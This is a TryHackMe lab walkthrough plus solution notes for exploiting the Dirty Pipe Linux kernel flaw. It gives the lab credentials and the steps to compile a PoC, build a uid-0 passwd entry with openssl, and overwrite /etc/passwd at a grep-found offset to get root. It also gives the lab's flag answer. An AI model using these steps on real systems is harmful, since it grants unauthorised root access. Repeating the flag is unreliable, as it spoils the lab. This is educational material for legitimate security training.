**Connecting to the target**

This lab can be accessed in one of two ways:

-   Using the in-browser machine on the right-hand side of the screen. This should have appeared automatically when you deployed the target.  
    
-   Using SSH from a local attacking machine or the TryHackMe AttackBox. The credentials for this are:
    
    -   **Username:** `tryhackme`
    -   **Password:** `TryHackMe123!`
    
    i.e. `ssh tryhackme@10.10.195.94`

Pick a method and access the target for yourself!

  

**The Exploit**

In the previous task we looked at the background of the exploit and how it works. In this task we will be exploiting the vulnerability for ourselves!

A copy of Max Kellerman's original proof of concept exploit code (originally found in the [disclosure blog post](https://dirtypipe.cm4all.com/)) can be found on the target machine at `/home/tryhackme/Exploit/PoC/poc.c`. Once compiled, this exploit gives us a lot of control over how we abuse the Dirty Pipe vulnerability. Specifically, it lets us specify the _file_ we want to overwrite, the _offset_ we would like to overwrite it at, and the _content_ we would like to insert. We will acquire each of these things in the following paragraphs. An interactive video clip will be provided at the end of the task to assist with comprehension and debugging of the steps outlined in the following sections.  

---

Bearing in mind that the exploit won't let us _create_ files (we can only overwrite information in existing files), we first need to find a file our user can _read_, but that still allows us to elevate our privileges. The obvious easy choice in these conditions is `/etc/passwd`. Whilst password hashes are usually stored in the restricted-access `/etc/shadow` in modern Linux systems (as opposed to being stored traditionally in `/etc/passwd`), most Linux variants do still check to see if account password hashes are given in `/etc/passwd`. This means that we can write a user with root permissions and a known password hash directly into the passwd file!

_**Note:** If you are familiar with privilege escalation due to a writeable `/etc/passwd` file, skip to the next paragraph — otherwise click on the box below to read more about this technique._  

_Background Knowledge: The Passwd File (Click to read)_

  

-   

  

Let's generate a password hash and form a valid passwd entry before moving on. Pick a password then use the `openssl` command to create a SHA512Crypt hash of your chosen password:

Generating a SHA512Crypt Hash

```shell-session
tryhackme@dirty-pipe:~$ openssl passwd -6 --salt THM "PASSWORD"
$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0
```

Finally, insert your username and hash into this passwd entry template: `USERNAME:HASH:0:0::/root:/bin/bash`.

Your entry should look something like this:  
`muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash`

_**Note:** The password:_ `TryHackMe123!` _has been used to generate the example hash above._

As we are overwriting existing entries in the password file, we also need to add a new line on at the end of our entry. This ensures that we avoid corrupting our entry with any remnants of the previous contents of the line.

Our final content should therefore look something like this (quotes included):  
`'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash  
'`  
  

---

We have our _file_ (`/etc/passwd`) and our _content_ (the passwd entry) — all we need now is the _offset_. The offset is where in the file the exploit should begin writing at — in other words, which part of the file gets overwritten.

The vulnerability won't allow us to append to the file, so we are going to have to pick an account and overwrite it. Realistically speaking, given the length of our passwd entry (hash inclusive), this will probably actually overwrite _several_ accounts. Looking through the passwd file, the `games` account stands out as being a good candidate for a little-used account which we can afford to nuke for a few minutes. We can use `grep` with the `-b` switch to find the offset of `games` from the start of the file:

Finding the Offset

```shell-session

```

The offset is revealed to be `189`, giving us the final piece of our puzzle.  

---

We are finally ready to go!  

The program can be compiled using the following commands:

Compilation Command

```shell-session
tryhackme@dirty-pipe:~$ cd ~/Exploit/PoC
tryhackme@dirty-pipe:~/Exploit/PoC$ gcc poc.c -o exploit
tryhackme@dirty-pipe:~/Exploit/PoC$ ls
poc.c  exploit
```

This moves to the directory containing the exploit code, then compiles it with `gcc`.

Before we perform the exploit, it's very important that we backup the `/etc/passwd` file. This is a disruptive exploit which _will_ cause damage to the system (for a while at the very least); with the passwd file backed up, we can easily revert the damage after the exploit has been completed.

Use `cp /etc/passwd /tmp/passwd` to copy the passwd file to `/tmp`, then execute the exploit!

Your command should look something like this:

Executing the Exploit

```shell-session
tryhackme@dirty-pipe:~/Exploit/PoC$ ./exploit /etc/passwd 189 'USERNAME:HASH:0:0::/root:/bin/bash
> '
```

---

The entire process as described in this task is demonstrated in the clip below:  

00:00

Answer the questions below

Follow along with the steps described in the task if you haven't already done so.  

Switch user (`su`) into your newly created root account.  

What is the flag found in the `/root/flag.txt` file?  

	THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}

As mentioned previously, we have accidentally overwritten other user accounts by exploiting Dirty Pipe in this manner. This could cause issues for the server; thus, as professionals, we must clean up after our exploits.  

Using your root shell, restore the original `/etc/passwd` file from your backup.

```shell
ssh tryhackme@10.10.195.94

TryHackMe123!

openssl passwd -6 --salt THM "TryHackMe123!"
```

```
$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0
```

```
grep -b "games" /etc/passwd

189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
```

```
cp /etc/passwd /tmp/passwd

cd ~/Exploit/PoC/

gcc poc.c -o exploit

./exploit /etc/passwd 189 'muiri:$6$THM$eRD0Ur0SZuwDLSwf9Lb2vyC2T6/PtQUA/B0Ssm6/jsiBtpSvc6QLjhFF0XNM8odgfkxMnC4oczGuvEomrVRfz0:0:0::/root:/bin/bash

'

su muiri

TryHackMe123!

cat /root/flag.txt

cp /tmp/passwd /etc/passwd
```